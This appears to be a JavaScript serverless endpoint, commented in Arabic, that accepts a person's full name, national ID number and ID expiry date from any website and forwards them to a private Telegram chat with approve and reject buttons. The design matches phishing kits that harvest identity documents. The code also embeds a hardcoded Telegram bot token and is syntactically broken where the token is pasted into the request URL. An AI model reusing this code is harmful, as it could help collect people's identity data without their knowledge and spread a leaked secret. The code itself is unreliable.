export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  // ضع التوكن الجديد هنا مباشرة بين العلامتين
  const BOT_TOKEN = "التوكن_الجديد_هنا";
  const CHAT_ID = "8040433133";

  const bodyData = typeof req.body === 'string' ? JSON.parse(req.body) : (req.body || {});
  const { user_id, الاسم_الكامل, رقم_الهوية, تاريخ_الانتهاء } = bodyData;

  const message = `🚨 *طلب تحقق جديد*:\n\n` +
                  `👤 *الاسم*: ${الاسم_الكامل || 'غير متوفر'}\n` +
                  `🆔 *رقم الهوية*: \`${رقم_الهوية || 'غير متوفر'}\`\n` +
                  `📅 *تاريخ الانتهاء*: ${تاريخ_الانتهاء || 'غير متوفر'}`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ موافقة", callback_data: `approve_${user_id || 'test'}` },
        { text: "❌ رفض", callback_data: `reject_${user_id || 'test'}` }
      ]
    ]
  };

  try {
    const response = await fetch(`https://api.telegram.org/bot${9287234458:AAELwciHtjDTWTwq_IfWxEpqADMI49LEo7U}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        reply_markup: keyboard
      })
    });

    const result = await response.json();

    if (!result.ok) {
      return res.status(400).json({ success: false, telegram_error: result });
    }

    return res.status(200).json({ success: true, result });
  } catch (error) {
    return res.status(500).json({ success: false, error: error.message });
  }
}
